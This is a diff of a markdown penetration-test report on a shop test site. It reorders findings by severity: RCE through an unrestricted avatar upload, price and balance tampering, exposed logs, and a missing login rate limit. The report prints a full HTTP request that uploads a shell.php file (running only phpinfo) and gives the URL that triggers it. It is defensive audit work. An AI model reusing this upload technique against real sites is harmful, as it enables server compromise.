@@ -7,14 +7,19 @@
 
 - Vulnerabilites
   
-  - High Impact
+  - Critical Impact
+    - RCE.
+ 
+ - High Impact
     - Buying anything!
     - Filling Up account balance.
-    - RCE.
+    
   
   - Medium Impact
-    - No rate limit.
     - Information disclosure.
+    
+  - Low Impact
+    - No rate limit.
 
     
 ## Date
@@ -25,6 +30,68 @@ Scope was limited to: **http://foophones.securitybrigade.com:8080/**
 
 ## Vulnerabilites
 Vulnerabilites founded are listed according to their impact levels, explanations, and potential recommendations.
+
+### Critical Impact
+##### RCE
+It was found that the upload functionality located at Register page is vulnerable to rce.
+Note: For the sake of poc only phpinfo file was called from the backend as it's tends to be a customer based audit.
+
+- Request => 
+```
+POST /register_confirm.php HTTP/1.1
+Host: foophones.securitybrigade.com:8080
+Content-Length: 715
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://foophones.securitybrigade.com:8080
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5mUqBA2v8K1dcRb0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://foophones.securitybrigade.com:8080/register.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: _ga=GA1.2.1263643996.1601440842; _gid=GA1.2.13543791.1601440842; PHPSESSID=4fpnkj94edkf83ug1ge89keni4
+Connection: close
+
+------WebKitFormBoundary5mUqBA2v8K1dcRb0
+Content-Disposition: form-data; name="fname"
+
+shivang3
+------WebKitFormBoundary5mUqBA2v8K1dcRb0
+Content-Disposition: form-data; name="lname"
+
+kumar3
+------WebKitFormBoundary5mUqBA2v8K1dcRb0
+Content-Disposition: form-data; name="country"
+
+india3
+------WebKitFormBoundary5mUqBA2v8K1dcRb0
+Content-Disposition: form-data; name="user"
+
+shivang3
+------WebKitFormBoundary5mUqBA2v8K1dcRb0
+Content-Disposition: form-data; name="pass"
+
+password
+------WebKitFormBoundary5mUqBA2v8K1dcRb0
+Content-Disposition: form-data; name="avatar"; filename="shell.php"
+Content-Type: application/octet-stream
+
+<?php phpinfo(); ?>
+
+------WebKitFormBoundary5mUqBA2v8K1dcRb0--
+```
+- Request to call the file =>
+**http://foophones.securitybrigade.com:8080/images/avatars/shell.php**
+
+
+The attack was successful as there was no restrictions in extentions and what data type was allowed.
+![Alt Text](https://i.ibb.co/k57x6LJ/screencapture-foophones-securitybrigade-8080-images-avatars-shell-php-2020-09-30-01-00-52.png)
+
+- Recommendation:
+Uploaded data should have a proper file/extension/mime declared before passing it to the database.
+
+
 
 ### High Impact
 
@@ -113,67 +180,17 @@ font color=green>Thank you for your purchase! The product will be shipped to : c
 - Recommendation:
   Backend code shloud not accept negative values.
   
-##### RCE
-It was found that the upload functionality located at Register page is vulnerable to rce.
-Note: For the sake of poc only phpinfo file was called from the backend as it's tends to be a customer based audit.
+### Medium Impact
 
-- Request => 
-```
-POST /register_confirm.php HTTP/1.1
-Host: foophones.securitybrigade.com:8080
-Content-Length: 715
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: http://foophones.securitybrigade.com:8080
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5mUqBA2v8K1dcRb0
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://foophones.securitybrigade.com:8080/register.php
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Cookie: _ga=GA1.2.1263643996.1601440842; _gid=GA1.2.13543791.1601440842; PHPSESSID=4fpnkj94edkf83ug1ge89keni4
-Connection: close
+#####  Information disclosure
+It was found that **/logs.txt** and **/logs** where exposed at **http://foophones.securitybrigade.com:8080/logs**  and **http://foophones.securitybrigade.com:8080/logs.txt** which contains response for backend servers
 
-------WebKitFormBoundary5mUqBA2v8K1dcRb0
-Content-Disposition: form-data; name="fname"
+This infomation can lead to a an issue if it contains critical informations.
 
-shivang3
-------WebKitFormBoundary5mUqBA2v8K1dcRb0
-Content-Disposition: form-data; name="lname"
-
-kumar3
-------WebKitFormBoundary5mUqBA2v8K1dcRb0
-Content-Disposition: form-data; name="country"
-
-india3
-------WebKitFormBoundary5mUqBA2v8K1dcRb0
-Content-Disposition: form-data; name="user"
-
-shivang3
-------WebKitFormBoundary5mUqBA2v8K1dcRb0
-Content-Disposition: form-data; name="pass"
-
-password
-------WebKitFormBoundary5mUqBA2v8K1dcRb0
-Content-Disposition: form-data; name="avatar"; filename="shell.php"
-Content-Type: application/octet-stream
-
-<?php phpinfo(); ?>
-
-------WebKitFormBoundary5mUqBA2v8K1dcRb0--
-```
-- Request to call the file =>
-**http://foophones.securitybrigade.com:8080/images/avatars/shell.php**
+- Recommendation: It best  not make this ciritcal endpoints public or having a proper 403 forbidden access in place can fix it too.
 
 
-The attack was successful as there was no restrictions in extentions and what data type was allowed.
-![Alt Text](https://i.ibb.co/k57x6LJ/screencapture-foophones-securitybrigade-8080-images-avatars-shell-php-2020-09-30-01-00-52.png)
-
-- Recommendation:
-Uploaded data should have a proper file/extension/mime declared before passing it to the database.
-
-
-### High Impact
+### Low Impact
 
 ##### No rate limit.
 It was found that there is not rate limit implementation were in place at **http://foophones.securitybrigade.com:8080/login.php** which could lead to account takeover via brute force.
@@ -259,10 +276,3 @@ Content-Type: text/html
 <font color=red>Username exists</font>
 ```
 - Recommendation: Having a google captcha can fix this issue.
-
-#####  Information disclosure
-It was found that **/logs.txt** and **/logs** where exposed at **http://foophones.securitybrigade.com:8080/logs**  and **http://foophones.securitybrigade.com:8080/logs.txt** which contains response for backend servers
-
-This infomation can lead to a an issue if it contains critical informations.
-
-- Recommendation: It best  not make this ciritcal endpoints public or having a proper 403 forbidden access in place can fix it too.
